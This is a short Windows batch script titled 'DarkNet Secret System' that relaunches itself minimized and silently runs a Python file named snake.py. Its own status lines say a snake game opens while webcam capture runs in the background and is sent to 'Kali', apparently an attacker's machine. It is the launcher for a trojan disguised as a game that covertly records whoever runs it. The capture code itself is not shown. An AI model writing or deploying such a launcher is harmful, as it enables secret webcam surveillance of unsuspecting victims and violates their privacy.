@echo off
title DarkNet Secret System
color 0A

:: Hide this batch window
if not "%1"=="hide" (
    start /min "" "%~f0" hide
    exit
)

echo ================================================
echo     DarkNet Secret System - Running
echo ================================================
echo.
echo [✓] Snake Game will open
echo [✓] Webcam capture running
echo [✓] Sending to Kali:
echo.
echo [!] This window is hidden in background
echo [!] Close task to stop
echo ================================================

:: Run Python script (hidden)
pythonw "%~dp0snake.py"

:: Keep batch running (hidden)
timeout /t 3600 /nobreak >nul
